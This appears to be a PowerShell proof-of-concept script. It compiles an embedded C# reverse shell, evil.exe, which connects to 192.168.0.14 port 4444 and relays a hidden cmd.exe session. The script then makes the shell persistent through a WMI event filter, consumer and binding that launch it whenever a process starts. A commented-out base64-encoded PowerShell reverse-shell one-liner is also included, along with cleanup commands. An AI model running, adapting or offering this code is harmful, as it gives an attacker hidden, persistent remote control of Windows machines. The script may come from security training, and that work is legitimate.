<#

To remove Events run following

Get-WmiObject __EventFilter -namespace root\subscription -filter "name='EvilExeFilter'" | Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='EvilExeConsumer'" | Remove-WmiObject
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription -Filter "Filter = ""__eventfilter.name='EvilExeFilter'""" | Remove-WmiObject



#>


$source = @"
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
    public class Program
    {
        static StreamWriter streamWriter;

        public static void Main(string[] args)
        {
            using (TcpClient client = new TcpClient("192.168.0.14", 4444))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                
                
            }
        }

    }
}
"@

Add-Type -TypeDefinition $source -Language CSharp -OutputAssembly "evil.exe" -OutputType ConsoleApplication

#$encoded = [System.Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('$client = New-Object System.Net.Sockets.TCPClient("192.168.0.14",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'))

#powershell.exe -enc  $encoded

#C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe

$WQLQuery = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 
             WHERE TargetInstance ISA "Win32_Process"
             AND TargetInstance.Name <> "evil.exe"'

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="EvilExeFilter";
                    EventNameSpace="root\cimv2";
                    QueryLanguage="WQL";
                    Query=$WQLQuery}


$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="EvilExeConsumer";
                 ExecutablePath = "C:\\Users\sunny\\test\\evil.exe";
                 CommandLineTemplate = "C:\\Users\sunny\\test\\evil.exe"
                }


Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}